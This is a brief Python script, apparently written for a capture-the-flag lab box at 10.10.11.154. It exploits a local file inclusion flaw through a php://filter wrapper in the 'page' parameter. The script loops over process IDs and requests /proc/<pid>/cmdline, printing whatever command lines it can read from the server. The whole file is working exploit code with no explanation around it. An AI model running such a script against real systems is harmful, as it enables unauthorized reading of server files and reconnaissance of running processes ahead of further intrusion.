import requests

base_url = "http://10.10.11.154/"
base_url_lfi = base_url + "index.php?page=php://filter/resource="

pid = 0
while pid == 0:
    for i in range(1, 1000):
        response = requests.get(base_url_lfi + '/proc/' + str(i) + '/cmdline')
        if response.text:
            print(i)
            print(response.text)
            pid = i